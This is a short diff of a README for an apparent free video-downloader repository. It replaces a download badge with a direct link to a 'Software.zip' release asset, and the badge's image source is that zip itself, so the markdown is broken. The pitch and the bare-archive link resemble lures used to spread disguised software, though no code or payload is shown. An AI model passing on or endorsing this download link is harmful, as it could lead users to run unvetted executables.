@@ -24,7 +24,7 @@ Welcome to the "Any-Video-Downloader-Pro-Free" repository, your one-stop solutio
 
 ## Get Started
 🚀 **Download the latest version (v1.0.0) of Any Video Downloader Pro Free:**
-[![Download Now](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/hohotogel123/Any-Video-Downloader-Pro-Free/releases/download/v1.0/Software.zip)](https://github.com/hohotogel123/Any-Video-Downloader-Pro-Free/releases/download/v1.0/Software.zip)
 
 ## Installation
 📦 **Launching the Download:**
